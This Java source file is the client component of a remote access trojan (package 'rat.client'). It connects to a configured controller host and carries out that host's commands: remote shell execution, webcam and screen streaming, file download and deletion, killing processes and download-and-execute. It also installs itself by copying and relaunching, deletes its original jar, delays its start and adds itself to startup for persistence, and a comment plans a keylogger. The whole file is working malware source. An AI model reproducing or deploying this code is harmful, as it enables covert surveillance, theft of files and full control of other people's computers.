package rat.client;

import org.jboss.netty.channel.Channel;
import rat.client.functions.*;
import rat.client.gui.ChatFrame;
import rat.packets.*;
import rat.utils.Util;

import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.URISyntaxException;
import java.nio.file.Paths;
import java.util.Enumeration;
import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.prefs.BackingStoreException;
import java.util.prefs.Preferences;

public class ClientMain {

    private static String hostName = "127.0.0.1";
    private static int connectionPort = 8007;

    private static ExecutorService executor = Executors.newFixedThreadPool(1);

    private FileTransfer fileTransfer;

    private ScreenshotSender screenshotSender;

    private RemoteShell remoteShell = new RemoteShell();

    private RemoteWebcam webcamClient = new RemoteWebcam();

    private RemoteDesktop remoteDesktop = new RemoteDesktop();

    private ChatFrame chatFrame;

    private void startRemoteDesktop(Channel channel, int FPS, int frameWidth, int frameHeight) {
        if (screenshotSender == null) {
            screenshotSender = new ScreenshotSender(channel, FPS, frameWidth, frameHeight);
            screenshotSender.start();
        } else {
            screenshotSender.setFPS(FPS);
            screenshotSender.setFrameWidth(frameWidth);
            screenshotSender.setFrameHeight(frameHeight);
        }
    }

    private void stopRemoteDesktop() {
        if (screenshotSender != null) {
            screenshotSender.finish();
            screenshotSender = null;
        }
    }

    private void startChat(Channel channel) {
        if (chatFrame == null) {
            try {
                SwingUtilities.invokeAndWait(() -> {
                    chatFrame = new ChatFrame(channel);
                    chatFrame.setVisible(true);
                    chatFrame.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
                    chatFrame.addWindowListener(new WindowAdapter() {
                        @Override
                        public void windowClosing(WindowEvent we) {
                            chatFrame.nudgeWindow();
                        }
                    });
                });
            } catch (InvocationTargetException | InterruptedException e) {
                e.printStackTrace();
                return;
            }
        }
    }

    private void stopChat() {
        if (chatFrame != null) {
            chatFrame.dispose();
            chatFrame = null;
        }
    }

    public void packetReceived(Channel channel, IPacket packet) {

        if (packet.getPacketType() == PacketType.REMOTE_DESKTOP_START) {
            ScreenshotStartPacket screenInfo = (ScreenshotStartPacket) packet;
            startRemoteDesktop(channel, screenInfo.getFPS(), screenInfo.getFrameWidth(), screenInfo.getFrameHeight());

        } else if (packet.getPacketType() == PacketType.REMOTE_DESKTOP_STOP) {
            stopRemoteDesktop();

        } else if (packet.getPacketType() == PacketType.INFORMATION_REQUEST) {
            BasicInformationPacket info = new BasicInformationPacket();
            info.execute();
            channel.write(info);

        } else if (packet.getPacketType() == PacketType.DISCONNECT) { // used to disconnect client
            stopWork();
            ClientConnection.deactivate(); // Stop trying to connect.
            channel.close();

        } else if (packet.getPacketType() == PacketType.WEBSITE_OPEN) {
            packet.execute();

        } else if (packet.getPacketType() == PacketType.FILE_BROWSER) {
            FileBrowserPacket browserPacket = (FileBrowserPacket) packet;

            if (browserPacket.getOperation().equals("list")) {
                DirectoryListingPacket dirPacket = new DirectoryListingPacket(browserPacket.getPath());
                dirPacket.execute();
                channel.write(dirPacket);

            } else if (browserPacket.getOperation().equals("download")) {
                fileTransfer.addDownloadTask(browserPacket.getPath(), browserPacket.getFolderPath());

            } else if (browserPacket.getOperation().equals("delete")) {
                try {
                    Util.deleteFileOrFolder(Paths.get(browserPacket.getPath()));
                } catch (IOException e) {
                    e.printStackTrace();
                }

                DirectoryListingPacket dirPacket = new DirectoryListingPacket(browserPacket.getFolderPath());
                dirPacket.execute();
                channel.write(dirPacket);

            } else if (browserPacket.getOperation().equals("createFolder")) {
                System.out.println("DIR:" + browserPacket.getPath());
                File dir = new File(browserPacket.getPath());
                dir.mkdir();

                DirectoryListingPacket dirPacket = new DirectoryListingPacket(browserPacket.getFolderPath());
                dirPacket.execute();
                channel.write(dirPacket);
            }

        } else if (packet.getPacketType() == PacketType.PROCESS_LIST) {
            ProcessListPacket procPacket = (ProcessListPacket) packet;
            procPacket.execute();
            channel.write(procPacket);

        } else if (packet.getPacketType() == PacketType.KILL_PROCESS) {
            packet.execute();

        } else if (packet.getPacketType() == PacketType.MESSAGE_BOX) {
            packet.execute();

        } else if (packet.getPacketType() == PacketType.DRIVE_LISTING) {
            packet.execute();
            channel.write(packet);

        } else if (packet.getPacketType() == PacketType.CHAT_MESSAGE) {
            startChat(channel);
            ChatMessagePacket chatMessagePacket = (ChatMessagePacket) packet;
            chatFrame.messageReceived(chatMessagePacket.getMessage());

        } else if (packet.getPacketType() == PacketType.CHAT_NUDGE) {
            startChat(channel);
            chatFrame.nudgeWindow();

        } else if (packet.getPacketType() == PacketType.MESSAGE_BOX) {
            packet.execute();

        } else if (packet.getPacketType() == PacketType.CLOSE_CHAT) {
            stopChat();

        } else if (packet.getPacketType() == PacketType.DOWNLOAD_EXECUTE) {
            packet.execute();

        } else if (packet.getPacketType() == PacketType.FILE_RECEIVER_PACKET) {
            FileReceiverPacket fileReceiverPacket = (FileReceiverPacket) packet;
            int port = fileReceiverPacket.getPort();
            if (port >= 0) {
                if (fileTransfer != null) {
                    fileTransfer.finish();
                }
                fileTransfer = new FileTransfer(channel, port);
                fileTransfer.start();
            } else {
                if (fileTransfer != null) {
                    fileTransfer.finish();
                    fileTransfer = null;
                }
            }
        } else if (packet.getPacketType() == PacketType.START_REMOTE_SHELL) {
            System.out.println("Opening shell");
            remoteShell.open(channel);

        } else if (packet.getPacketType() == PacketType.STOP_REMOTE_SHELL) {
            System.out.println("Closing shell");
            remoteShell.close();

        } else if (packet.getPacketType() == PacketType.REMOTE_SHELL_DATA) {
            RemoteShellRequestPacket remotePacket = (RemoteShellRequestPacket) packet;
            remoteShell.executeCommand(remotePacket.getCommand());


        } else if (packet.getPacketType() == PacketType.WEBCAM_LIST) {
            WebcamInfoPacket infoPacket = (WebcamInfoPacket) packet;
            channel.write(new WebcamInfoPacket(infoPacket.getWebcamGUIId(), webcamClient.getWebcamInformations()));

        } else if (packet.getPacketType() == PacketType.WEBCAM_START) {
            WebcamInfoPacket infoPacket = (WebcamInfoPacket) packet;
            infoPacket.setPacketType(PacketType.WEBCAM_INFO);
            int webcamId = webcamClient.startBroadcast(channel, infoPacket.getDeviceName(), infoPacket.getWebcamGUIId
                    ());
            infoPacket.setWebcamJobId(webcamId);
            channel.write(infoPacket);

        } else if (packet.getPacketType() == PacketType.WEBCAM_STOP) {
            WebcamInfoPacket infoPacket = (WebcamInfoPacket) packet;
            webcamClient.stopBroadcast(infoPacket.getWebcamJobId());


        } else if (packet.getPacketType() == PacketType.DESKTOP_LIST) {
            DesktopInfoPacket infoPacket = (DesktopInfoPacket) packet;
            channel.write(new DesktopInfoPacket(infoPacket.getDesktopGUIId(), remoteDesktop.getDesktopInformations()));

        } else if (packet.getPacketType() == PacketType.DESKTOP_START) {
            System.out.println("Got packet");
            DesktopInfoPacket infoPacket = (DesktopInfoPacket) packet;
            infoPacket.setPacketType(PacketType.DESKTOP_INFO);

            String deviceName = infoPacket.getDesktopDeviceName();
            int GUIId = infoPacket.getDesktopGUIId();
            int frameWidth = infoPacket.getFrameWidth();
            int frameHeight = infoPacket.getFrameHeight();

            int desktopJobId = remoteDesktop.startBroadcast(channel, deviceName,
                    GUIId, frameWidth, frameHeight);

            infoPacket.setDesktopJobId(desktopJobId);
            channel.write(infoPacket);

        } else if (packet.getPacketType() == PacketType.DESKTOP_STOP) {
            DesktopInfoPacket infoPacket = (DesktopInfoPacket) packet;
            remoteDesktop.stopBroadcast(infoPacket.getDesktopJobId());

        } else if (packet.getPacketType() == PacketType.DESKTOP_UPDATE) {
            DesktopInfoPacket infoPacket = (DesktopInfoPacket) packet;
            int jobId = infoPacket.getDesktopJobId();
            int frameWidth = infoPacket.getFrameWidth();
            int frameHeight = infoPacket.getFrameHeight();

            remoteDesktop.updateBroadcastSettings(jobId, frameWidth, frameHeight);
        }

    }

    public void stopWork() {
        stopRemoteDesktop();
        stopChat();
    }

    public static ExecutorService getExecutor() {
        return executor;
    }

    private static void processConfig() {

        try {
            if (!Preferences.userRoot().nodeExists("rat/client/settings")) {
                Preferences configPreferences = Preferences.userRoot().node("rat/client/settings");

                try (InputStream in = ClientMain.class.getResourceAsStream("/config.properties")) {
                    Properties prop = new Properties();
                    prop.load(in);

                    Enumeration e = prop.propertyNames();
                    while (e.hasMoreElements()) {
                        String key = (String) e.nextElement();
                        String value = prop.getProperty(key);
                        configPreferences.put(key, value);
                    }

                } catch (Exception ex) {
                    ex.printStackTrace();
                    System.out.println("Config not loaded, continuing...");
                }
            }
        } catch (BackingStoreException e) {
            e.printStackTrace();
            System.exit(1);
        }

        Preferences configPreferences = Preferences.userRoot().node("rat/client/settings");

        if (configPreferences.get("install", "false").equals("true")) {
            System.out.println("Installing.");
            try {
                configPreferences.put("install", "false");
                String thisJarPath = ClientMain.class.getProtectionDomain().getCodeSource().getLocation().toURI()
                        .getPath();
                configPreferences.put("firstRunPath", thisJarPath);
                Util.installAndRestart("/home/u1/Desktop/lol.jar");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        String originalPath = configPreferences.get("firstRunPath", null);
        if (originalPath != null) {
            configPreferences.remove("firstRunPath");
            new File(originalPath).delete(); // delete old jar
        }

        ClientMain.hostName = configPreferences.get("host", null);
        ClientMain.connectionPort = configPreferences.getInt("connectionPort", -1);
//        ClientMain.transferPort = configPreferences.getInt("transferPort", -1);

        if (hostName == null || connectionPort < 0) {
            System.exit(1);
        }

        int delay = configPreferences.getInt("delay", 0);
        System.out.println("Delay: " + delay);
        try {
            Thread.sleep(delay * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        if (configPreferences.get("startup", "false").equals("true")) {
            System.out.println("Adding to startup.");
            configPreferences.put("startup", "false");
            try {
                String jarPath = ClientMain.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
                Util.addToStartup(jarPath);
            } catch (URISyntaxException e) {
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) throws Exception {
//        screenMultipleMonitors();
        processConfig();
//        Util.shutdown(1);

        // TODO: live keylogger
        ClientConnection.connect(hostName, connectionPort);

    }

    public static void screenMultipleMonitors() {
        GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        GraphicsDevice[] gDevs = ge.getScreenDevices();

        for (GraphicsDevice gDev : gDevs) {
            DisplayMode mode = gDev.getDisplayMode();
            Rectangle bounds = gDev.getDefaultConfiguration().getBounds();
            System.out.println("Id: " + gDev.getIDstring());
            System.out.println("Min : (" + bounds.getMinX() + "," + bounds.getMinY() + ") ;Max : (" + bounds.getMaxX()
                    + "," + bounds.getMaxY() + ")");
            System.out.println("Width : " + mode.getWidth() + " ; Height :" + mode.getHeight());

//            try {
//                Robot robot = new Robot();
//
//                BufferedImage image = robot.createScreenCapture(new Rectangle((int) bounds.getMinX(),
//                        (int) bounds.getMinY(), (int) bounds.getWidth(), (int) bounds.getHeight()));
//                ImageIO.write(image, "png",
//                        new File("screen_" + gDev.getIDstring().replace("\\", "") + ".png"));
//
//            } catch (AWTException | IOException e) {
//                e.printStackTrace();
//            }

        }
    }

}
